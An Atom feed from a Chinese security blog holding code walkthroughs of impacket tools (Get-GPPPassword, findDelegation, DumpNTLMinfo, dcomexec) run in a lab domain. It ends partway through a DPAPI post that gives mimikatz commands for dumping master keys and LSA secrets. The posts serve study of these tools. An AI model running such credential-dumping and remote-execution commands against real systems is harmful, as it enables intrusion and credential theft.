@@ -1,0 +1,1355 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://iceberg-n.github.io</id>
+    <title>Iceberg-N</title>
+    <updated>2023-11-15T08:56:00.955Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://iceberg-n.github.io"/>
+    <link rel="self" href="https://iceberg-n.github.io/atom.xml"/>
+    <subtitle>iceberg-N的网安之路</subtitle>
+    <logo>https://iceberg-n.github.io/images/avatar.png</logo>
+    <icon>https://iceberg-n.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Iceberg-N</rights>
+    <entry>
+        <title type="html"><![CDATA[impacket -- Get-GPPPassword浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-get-gpppassword-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-get-gpppassword-qian-xi/">
+        </link>
+        <updated>2023-11-15T08:54:29.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="impacket-get-gpppassword浅析">impacket -- Get-GPPPassword浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="impacket-get-gpppassword浅析">impacket -- Get-GPPPassword浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 可用于转储组策略首选项密码。与其他类似工具不同的是，该实用程序不会从 DC 挂载远程 SYSVOL 共享，而是使用流来导航共享并刻录文件内容。</p>
+<h3 id="实验环境">实验环境</h3>
+<p>win2019(DC)：192.168.1.137</p>
+<p>win10(attack)：192.168.1.129</p>
+<p>测试命令</p>
+<pre><code>python Get-GPPPassword.py domain.local/administrator:&quot;Admin@123&quot;@192.168.1.137
+</code></pre>
+<h2 id="代码分析">代码分析</h2>
+<p>该脚本非为在线和离线两个方式</p>
+<h3 id="在线">在线</h3>
+<p>在线破解的主函数如下：</p>
+<pre><code class="language-PYTHON">domain, username, password, address, lmhash, nthash = parse_target(args)
+try:
+    smbClient = init_smb_session(args, domain, username, password, address, lmhash, nthash)
+    g = GetGPPasswords(smbClient, args.share)
+    g.list_shares()
+    g.find_cpasswords(args.base_dir)
+except Exception as e:
+    if logging.getLogger().level == logging.DEBUG:
+        traceback.print_exc()
+    logging.error(str(e))
+</code></pre>
+<h4 id="建立smb连接">建立SMB连接</h4>
+<p>init_smb_session()创建SMB连接并进行认证；</p>
+<pre><code class="language-PYTHON">def init_smb_session(args, domain, username, password, address, lmhash, nthash):
+    smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
+    dialect = smbClient.getDialect()
+    if dialect == SMB_DIALECT:
+        logging.debug(&quot;SMBv1 dialect used&quot;)
+    elif dialect == SMB2_DIALECT_002:
+        logging.debug(&quot;SMBv2.0 dialect used&quot;)
+    elif dialect == SMB2_DIALECT_21:
+        logging.debug(&quot;SMBv2.1 dialect used&quot;)
+    else:
+        logging.debug(&quot;SMBv3.0 dialect used&quot;)
+    if args.k is True:
+        smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
+    else:
+        smbClient.login(username, password, domain, lmhash, nthash)
+    if smbClient.isGuestSession() &gt; 0:
+        logging.debug(&quot;GUEST Session Granted&quot;)
+    else:
+        logging.debug(&quot;USER Session Granted&quot;)
+    return smbClient
+</code></pre>
+<p>对应流量如下;</p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1700038493820.png" alt="" loading="lazy"></figure>
+<h4 id="列出共享文件夹">列出共享文件夹</h4>
+<p>然后继续实例化GetGPPasswords类，调用g.list_shares()列出共享文件夹，进入list_shares()</p>
+<p>self.smb.listShares()该函数查找DC中的共享文件；</p>
+<p>并遍历输出；</p>
+<pre><code class="language-PYTHON">def list_shares(self):
+    logging.info(&quot;Listing shares...&quot;)
+    resp = self.smb.listShares()
+    shares = []
+    for k in range(len(resp)):
+        shares.append(resp[k][&quot;shi1_netname&quot;][:-1])
+        print(&quot;  - %s&quot; % resp[k][&quot;shi1_netname&quot;][:-1])
+    print()
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1700038500798.png" alt="" loading="lazy"></figure>
+<h4 id="寻找密码">寻找密码</h4>
+<p>进入g.find_cpasswords()在共享文件夹中进行查询密码操作；遍历每个子文件夹中的所有文件，搜索关键词&quot;cpassword&quot;</p>
+<pre><code class="language-PYTHON">def find_cpasswords(self, base_dir, extension=&quot;xml&quot;):
+    logging.info(&quot;Searching *.%s files...&quot; % extension)
+    # Breadth-first search algorithm to recursively find .extension files
+    files = []
+    searchdirs = [base_dir + &quot;/&quot;]
+    while len(searchdirs) != 0:
+        next_dirs = []
+        for sdir in searchdirs:
+            logging.debug(&quot;Searching in %s &quot; % sdir)
+            try:
+                for sharedfile in self.smb.listPath(self.share, sdir + &quot;*&quot;, password=None):
+                    if sharedfile.get_longname() not in [&quot;.&quot;, &quot;..&quot;]:
+                        if sharedfile.is_directory():
+                            logging.debug(&quot;Found directory %s/&quot; % sharedfile.get_longname())
+                            next_dirs.append(sdir + sharedfile.get_longname() + &quot;/&quot;)
+                        else:
+                            if sharedfile.get_longname().endswith(&quot;.&quot; + extension):
+                                logging.debug(&quot;Found matching file %s&quot; % (sdir + sharedfile.get_longname()))
+                                results = self.parse(sdir + sharedfile.get_longname())
+                                if len(results) != 0:
+                                    self.show(results)
+                                    files.append({&quot;filename&quot;: sdir + sharedfile.get_longname(), &quot;results&quot;: results})
+                            else:
+                                logging.debug(&quot;Found file %s&quot; % sharedfile.get_longname())
+            except SessionError as e:
+                logging.debug(e)
+        searchdirs = next_dirs
+        logging.debug(&quot;Next iteration with %d folders.&quot; % len(next_dirs))
+    return files
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://iceberg-n.github.io/post-images/1700038507385.png" alt="" loading="lazy"></figure>
+<p>截图中的流量是一次完整的查找流量，先Tree Connect 请求\192.168.1.137\SYSVOL；再请求跟目录，再搜索根目录中的内容，搜索结束关闭连接；</p>
+<h2 id="总结">总结</h2>
+<p>本文简单的分析了impacket的Get-GPPPassword.py脚本中在线查找首选项密码的整个流程，通过SMB协议在域共享文件夹SYSVOL(域内组策略)中搜索所有文件中是否存在&quot;cpassword&quot;关键字来查找首选项密码；</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket -- findDelegation浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-finddelegation-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-finddelegation-qian-xi/">
+        </link>
+        <updated>2023-11-15T08:53:21.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="impacket-finddelegation浅析">impacket -- findDelegation浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="impacket-finddelegation浅析">impacket -- findDelegation浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 找出AD域环境中所有的委托关系(非约束性委派、约束性委派、基于资源的约束性委派)</p>
+<h3 id="实验环境">实验环境</h3>
+<p>win2019(域控)：192.168.1.137</p>
+<p>win10(攻击机)：192.168.1.29</p>
+<p>测试命令</p>
+<pre><code>python findDelegation.py domain.local/administrator:Admin@123 -dc-ip 192.168.1.137
+</code></pre>
+<h2 id="代码分析">代码分析</h2>
+<p>对命令行参数进行处理后，开始进入到ldap查询函数；</p>
+<p>实例化FindDelegation()并执行其中的run()；</p>
+<pre><code class="language-PYTHON">try:
+    executer = FindDelegation(username, password, userDomain, targetDomain, options)
+    executer.run()
+except Exception as e:
+    if logging.getLogger().level == logging.DEBUG:
+        import traceback
+        traceback.print_exc()
+    logging.error(str(e))
+</code></pre>
+<p>进入run()中，ldap.LDAPConnection()创建ldap连接</p>
+<pre><code class="language-PYTHON">try:
+    ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
+    if self.__doKerberos is not True:
+        ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+    else:
+        ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                     self.__aesKey, kdcHost=self.__kdcIP)
+</code></pre>
+<p>ldap.LDAPConnection()对DC发起连接；</p>
+<pre><code class="language-PYTHON">ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1700038436435.png" alt="" loading="lazy"></figure>
+<p>ldapConnection.login()进行ldap身份验证</p>
+<pre><code class="language-PYTHON">ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1700038443699.png" alt="" loading="lazy"></figure>
+<p>构造ldap查询语法并赋值给searchFilter，ldapConnection.search()使用语法对ldap数据库进行查询；</p>
+<pre><code class="language-PYTHON">searchFilter = &quot;(&amp;(|(UserAccountControl:1.2.840.113556.1.4.803:=16777216)(UserAccountControl:1.2.840.113556.1.4.803:=&quot; \
+                   &quot;524288)(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot; \
+                   &quot;(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(UserAccountControl:1.2.840.113556.1.4.803:=8192)))&quot;
+
+    try:
+        resp = ldapConnection.search(searchFilter=searchFilter,
+                                     attributes=['sAMAccountName',
+                                                 'pwdLastSet', 'userAccountControl', 'objectCategory',
+                                                 'msDS-AllowedToActOnBehalfOfOtherIdentity', 'msDS-AllowedToDelegateTo'],
+                                     sizeLimit=999)
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://iceberg-n.github.io/post-images/1700038450392.png" alt="" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>本文对impacket中的findDelegation.py进行浅析，该脚本实现很简单，通过连接ldap数据库并进行查询具有委派权限的对象；</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket -- DumpNTLMinfo浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-dumpntlminfo-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-dumpntlminfo-qian-xi/">
+        </link>
+        <updated>2023-11-15T08:51:07.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="impacket-dumpntlminfo浅析">impacket -- DumpNTLMinfo浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="impacket-dumpntlminfo浅析">impacket -- DumpNTLMinfo浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 在 ntlm 身份验证模型中转储远程主机信息，无需凭据；</p>
+<p><strong>方式：</strong> SMB、RPC；</p>
+<h3 id="测试环境">测试环境</h3>
+<p>win2019(被攻击机)：192.168.1.137</p>
+<p>win10(攻击机)：192.168.1.29</p>
+<p>使用命令：</p>
+<ul>
+<li>smb</li>
+</ul>
+<pre><code>python DumpNTLMInfo.py 192.168.1.137
+</code></pre>
+<p>命令执行截图：</p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1700038304714.png" alt="" loading="lazy"></figure>
+<ul>
+<li>rpc</li>
+</ul>
+<pre><code>python DumpNTLMInfo.py 192.168.1.137 -port 135
+</code></pre>
+<p>命令执行截图：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1700038312302.png" alt="" loading="lazy"></figure>
+<h2 id="代码分析">代码分析</h2>
+<p>main()方法中，实例化DumpNtlm()，并进入dumper.DisplayInfo()中；</p>
+<pre><code class="language-PYTHON">try:
+ if options.target_ip is not None:
+     dumper = DumpNtlm(options.target_ip, options.target, int(options.port))
+ else:
+     dumper = DumpNtlm(options.target, options.target, int(options.port))
+ dumper.DisplayInfo()
+except Exception as e:
+ if logging.getLogger().level == logging.DEBUG:
+     import traceback
+     traceback.print_exc()
+ logging.error(str(e))
+</code></pre>
+<p>跟据端口判断使用SMB通信和RPC通信；</p>
+<pre><code class="language-PYTHON">def DisplayInfo(self):
+    if self._sess_port in [139, 445]:
+        self.DisplaySmbInfo()
+    elif  self._sess_port in [135]:
+        self.DisplayRpcInfo()   
+</code></pre>
+<h3 id="smb">SMB</h3>
+<p>进入DisplaySmbInfo()中，</p>
+<p>SmbConnection()进行SMB连接初始化；</p>
+<p>connection.NegotiateSession()进行SMB会话协商；</p>
+<p>connection.IsSmb1Enabled()</p>
+<p>connection.GetChallange()</p>
+<pre><code class="language-PYTHON">def DisplaySmbInfo(self):
+    connection = SmbConnection(self.target, self.hostname, self._sess_port)
+
+    negotiation = connection.NegotiateSession()
+    dialect = negotiation['DialectRevision']
+    secMode = negotiation['SecurityMode']
+
+    smb1_enabled = connection.IsSmb1Enabled()
+
+    self.DisplayDialect(dialect, smb1_enabled)
+    self.DisplaySigning(secMode)
+    self.DisplayIo(negotiation)
+    self.DisplayTime(negotiation)
+
+    ntlmChallenge = connection.GetChallange()
+    self.DisplayChallangeInfo(ntlmChallenge)
+
+    nullSession = connection.Authenticate()
+    self.DisplayNullSession(nullSession)
+</code></pre>
+<h4 id="smb协商">SMB协商</h4>
+<p>进入NegotiatsSession()中，此模块进行协商运请求</p>
+<pre><code class="language-PYTHON">def NegotiateSession(self):
+    flags1 = SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS
+    flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
+
+    negoData = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
+    if self._sess_port == nmb.NETBIOS_SESSION_PORT:
+        negoData = '\x02NT LM 0.12\x00\x02SMB 2.002\x00'
+
+    packet = self._negotiateSessionWildcard(True, flags1=flags1, flags2=flags2, data=negoData)
+
+    if packet[0:1] == b'\xfe':
+        self._SMBConnection = SMB3(self.hostname, self.target, self._myName, self._sess_port, 
+                                    self._timeout, session=self._nmbSession, negSessionResponse=SMB2Packet(packet))
+    else:
+        self._SMBConnection = SMB1(self.hostname, self.target, self._myName, self._sess_port, 
+                                    self._timeout, session=self._nmbSession, negSessionResponse=packet)
+    return self._SMBConnection.GetNegotiateResponse()
+</code></pre>
+<p>对应代码如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://iceberg-n.github.io/post-images/1700038325439.png" alt="" loading="lazy"></figure>
+<h4 id="smb-v1版本支持检测">SMB V1版本支持检测</h4>
+<p>connection.Issmb1Enabled()检测目标服务器是否支持SMB V1 通信；</p>
+<pre><code class="language-PYTHON">smb1_enabled = connection.IsSmb1Enabled()
+</code></pre>
+<p>进入IsSmb1Enabled()</p>
+<pre><code class="language-PYTHON">def IsSmb1Enabled(self):
+    flags1 = SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS
+    flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
+    smbv1NegoData = '\x02NT LM 0.12\x00'
+    smb1_enabled = False
+    try:
+        self._negotiateSessionWildcard(True, flags1=flags1, flags2=flags2, data=smbv1NegoData)
+    except Exception as e:
+        if 'No answer!' in str(e):
+            smb1_enabled = False
+    else:
+        smb1_enabled = True
+    return smb1_enabled
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="4"><img src="https://iceberg-n.github.io/post-images/1700038332870.png" alt="" loading="lazy"></figure>
+<h4 id="smb身份验证">SMB身份验证</h4>
+<p>connection.GetChallange()进行获取信息</p>
+<pre><code class="language-PYTHON">ntlmChallenge = connection.GetChallange()
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="5"><img src="https://iceberg-n.github.io/post-images/1700038341179.png" alt="" loading="lazy"></figure>
+<p>在目标服务器的Session Setup Response会返回当前服务器的一些信息；</p>
+<figure data-type="image" tabindex="6"><img src="https://iceberg-n.github.io/post-images/1700038347273.png" alt="" loading="lazy"></figure>
+<h4 id="smb匿名访问">SMB匿名访问</h4>
+<p>connection.Authenticate()探测是否支持SMB匿名访问；</p>
+<pre><code>nullSession = connection.Authenticate()
+</code></pre>
+<p>对应的流量如下：</p>
+<figure data-type="image" tabindex="7"><img src="https://iceberg-n.github.io/post-images/1700038354348.png" alt="" loading="lazy"></figure>
+<h3 id="rpc">RPC</h3>
+<p>通过rpc通信探测目标主机的版本；</p>
+<p>进入rpc.GetChallange()方法中，</p>
+<p>RPC()建立TCP连接；</p>
+<p>rpc.GetChallange()发送EPM RPC绑定请求并且进行ntlm认证，目标服务器器会在bind响应包中携带主机信息；</p>
+<pre><code class="language-PYTHON">def DisplayRpcInfo(self):
+    rpc = RPC(self.target)
+
+    ntlmChallenge = rpc.GetChallange()
+    self.DisplayChallangeInfo(ntlmChallenge)
+
+    self.DisplayIo({'MaxReadSize': rpc.MaxTrasmitionSize, 'MaxWriteSize': rpc.MaxTrasmitionSize})
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://iceberg-n.github.io/post-images/1700038361514.png" alt="" loading="lazy"></figure>
+<p>在bind response中发现主机信息：</p>
+<figure data-type="image" tabindex="9"><img src="https://iceberg-n.github.io/post-images/1700038367336.png" alt="" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>本文对impacket中DumpNTLMinfo脚本浅析，该脚本通过NTLM认证手机目标主机信息、是否支持匿名访问等；</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket -- dcomexec浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-dcomexec-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-dcomexec-qian-xi/">
+        </link>
+        <updated>2023-11-14T07:09:41.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="dcomexec-浅析">dcomexec 浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="dcomexec-浅析">dcomexec 浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 利用DCOM接口进行命令执行；</p>
+<p><strong>条件：</strong></p>
+<ol>
+<li>关闭防火墙</li>
+<li>域内高权限账户</li>
+</ol>
+<h3 id="测试环境">测试环境</h3>
+<ol>
+<li>
+<p>DC(域控)：192.168.1.137</p>
+</li>
+<li>
+<p>win10(攻击机)：192.168.1.129</p>
+</li>
+<li>
+<p>win7(被攻击机)：192.168.1.148</p>
+</li>
+</ol>
+<p><strong>测试命令</strong></p>
+<pre><code>python dcomexec.py domain.local/administrator:&quot;Admin@123&quot;@192.168.1.148 hostname -debug
+</code></pre>
+<h2 id="代码分析">代码分析</h2>
+<p>获取命令行输入后，实例化DCOMEXEC，并进入DCOMEXEC.run()中；</p>
+<pre><code class="language-PYTHON">executer = DCOMEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
+                    options.share, options.nooutput, options.k, options.dc_ip, options.object, options.shell_type)
+executer.run(address, options.silentcommand)
+</code></pre>
+<p>进入到run()中，先进行了SMB连接；</p>
+<pre><code class="language-python">if self.__noOutput is False and silentCommand is False:
+    smbConnection = SMBConnection(addr, addr)
+    if self.__doKerberos is False:
+        smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+    else:
+        smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                    self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
+
+    dialect = smbConnection.getDialect()
+    if dialect == SMB_DIALECT:
+        logging.info(&quot;SMBv1 dialect used&quot;)
+    elif dialect == SMB2_DIALECT_002:
+        logging.info(&quot;SMBv2.0 dialect used&quot;)
+    elif dialect == SMB2_DIALECT_21:
+        logging.info(&quot;SMBv2.1 dialect used&quot;)
+    else:
+        logging.info(&quot;SMBv3.0 dialect used&quot;)
+else:
+    smbConnection = None
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945828030.png" alt="" loading="lazy"></p>
+<p>DCOMConnection()方法进行DCOM连接；</p>
+<pre><code class="language-python">dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                      self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945838211.png" alt="" loading="lazy"></p>
+<p>这里判断DCOM对象类型，默认为Shellwindows，并获取对象Item和Document的调度标识符，并且通过Invoke()进行调用；</p>
+<pre><code class="language-python">if self.__dcomObject == 'ShellWindows':
+    # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
+    iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
+    iMMC = IDispatch(iInterface)
+    resp = iMMC.GetIDsOfNames(('Item',))
+    resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+    iItem = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+    resp = iItem.GetIDsOfNames(('Document',))
+    resp = iItem.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+    pQuit = None
+elif self.__dcomObject == 'ShellBrowserWindow':
+    # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
+    iInterface = dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
+    iMMC = IDispatch(iInterface)
+    resp = iMMC.GetIDsOfNames(('Document',))
+    resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+    pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+elif self.__dcomObject == 'MMC20':
+    iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
+    iMMC = IDispatch(iInterface)
+    resp = iMMC.GetIDsOfNames(('Document',))
+    resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+    pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+else:
+    logging.fatal('Invalid object %s' % self.__dcomObject)
+    return
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945845826.png" alt="" loading="lazy"></p>
+<p>我们选的DCOM对象为Shellwindows，进入else中，获取ShellExecute的调度标识符，并通过Invoke()进行调用；</p>
+<pre><code class="language-PYTHON">if self.__dcomObject == 'MMC20':
+    resp = iDocument.GetIDsOfNames(('ActiveView',))
+    resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+    iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+    pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
+    self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
+else:
+    resp = iDocument.GetIDsOfNames(('Application',))
+    resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+    iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+    pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
+   self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945855968.png" alt="" loading="lazy"></p>
+<p>初始化RemoteShell，进行两次命令执行，分别为移动到根目录和查看当前位置；</p>
+<pre><code class="language-PYTHON">class RemoteShell(cmd.Cmd):
+    def __init__(self, share, quit, executeShellCommand, smbConnection, shell_type, silentCommand=False):
+        cmd.Cmd.__init__(self)
+        self._share = share
+        self._output = '\\' + OUTPUT_FILENAME
+        self.__outputBuffer = ''
+        self._shell = 'cmd.exe'
+        self.__shell_type = shell_type
+        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        self.__quit = quit
+        self._executeShellCommand = executeShellCommand
+        self.__transferClient = smbConnection
+        self._silentCommand = silentCommand
+        self._pwd = 'C:\\windows\\system32'
+        self._noOutput = False
+        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
+
+        # We don't wanna deal with timeouts from now on.
+        if self.__transferClient is not None:
+            self.__transferClient.setTimeout(100000)
+            self.do_cd('\\')
+        else:
+            self._noOutput = True
+</code></pre>
+<p>第一次命令执行<code>&quot;cd \&quot;</code>流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945865989.png" alt="" loading="lazy"></p>
+<p>查看Invoke流量包详情即可发现命令执行内容；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945868914.png" alt="" loading="lazy"></p>
+<p>第二次命令执行&quot;cd&quot;，流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945877716.png" alt="" loading="lazy"></p>
+<p>对我们输入的命令进行判断，如果没输入命令执行内容则进入交互式shell模式，如果存在则进行单次命令执行及进入onecmd()，执行相关命令，我们测试命令为hostname；</p>
+<pre><code>if self.__command != ' ':
+    try:
+        self.shell.onecmd(self.__command)
+    except TypeError:
+        if not silentCommand:
+            raise
+    if self.shell is not None:
+        self.shell.do_exit('')
+else:
+    self.shell.cmdloop()
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945885148.png" alt="" loading="lazy"></p>
+<p>查看Inove数据包详情即可发现命令执行内容；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945888264.png" alt="" loading="lazy"></p>
+<p>查看未加密smb协议中的Read Response流量包详情即可发现命令执行后的内容；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945896098.png" alt="" loading="lazy"></p>
+<p>命令执行后，断开DCOM和smb连接；</p>
+<pre><code>if smbConnection is not None:
+    smbConnection.logoff()
+dcom.disconnect()
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945902027.png" alt="" loading="lazy"></p>
+<h2 id="总结">总结</h2>
+<p>本文浅析了dcomexec命令执行的整个过程，本次测试在win7上命令执行成功；win2019、win2016测试失败，报错&quot;rpc_s_access_denied&quot;；该报错为凭据正确但没有命令执行权限，但我们使用的是域administtrator账号。。。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket -- dpadpi浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-dpadpi-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-dpadpi-qian-xi/">
+        </link>
+        <updated>2023-11-14T06:59:55.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="dpadpi浅析">dpadpi浅析</h1>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="dpadpi浅析">dpadpi浅析</h1>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p><strong>作用：</strong> 获取Master Key，或者通过Master Key解密DPAPI</p>
+<p><strong>条件：</strong> 无需凭据，提供目标地址即可；</p>
+<h3 id="dpapi">DPAPI</h3>
+<p>DPAPI是一个提供数据保护服务的Windows API；主要用于加密解密数据；</p>
+<p>DPAPI 用于加密了：</p>
+<ul>
+<li>Chrome、Edge、IE 浏览器中用户保存的密码与 Cookie</li>
+<li>Outlook、Windows Mail 中用户保存的密码</li>
+<li>RDP 连接的密码</li>
+<li>保存的 WLAN 密码</li>
+<li>EFS 的私钥</li>
+<li>等</li>
+</ul>
+<h3 id="master-key">Master Key</h3>
+<p>Master Key为DPAPI过程中加密用的密钥，加密后的密文叫做Blob；分为用户Master Key和系统Master Key；</p>
+<p>用户Master Key存储位置：<code>%UserProfile%\AppData\Roaming\Microsoft\Protect\[SID]</code>；</p>
+<p>系统Master Key存储位置：</p>
+<ol>
+<li>
+<p><code>C:\Windows\System32\Microsoft\Protect\S-1-5-18</code>(当调用 C 或者.NET API 进行 DPAPI 加密，且选择了当前机器加密，会使用此目录的 Master Key)；</p>
+</li>
+<li>
+<p><code>C:\Windows\System32\Microsoft\Protect\S-1-5-18\User</code>(用于加密 Windows Vault、企业 WLAN 凭据)；</p>
+</li>
+</ol>
+<p>Master Key为隐匿文件，查看方法：</p>
+<pre><code># 查看隐匿文件
+dir /a
+
+#取消隐匿
+attrib -h -s *
+</code></pre>
+<p>Master Key 本身也是被加密的</p>
+<ul>
+<li>在工作组环境中，需要 SID、用户密码的 SHA1 哈希来解密；</li>
+<li>在域环境中，需要 SID、用户密码的 NT 哈希来解密，或者使用域备份密钥来解密；</li>
+</ul>
+<h4 id="解密master-key">解密Master Key</h4>
+<h5 id="在线获得明文-master-key">在线获得明文 Master Key</h5>
+<p>获取用户 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit
+</code></pre>
+<p>获取系统 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapisystem&quot; exit
+.\mimikatz &quot;privilege::debug&quot; &quot;lsadump::secrets&quot; exit
+12
+</code></pre>
+<h5 id="在线解密用户-master-key">在线解密用户 Master Key</h5>
+<p>调用 RPC 解密用户 Master Key</p>
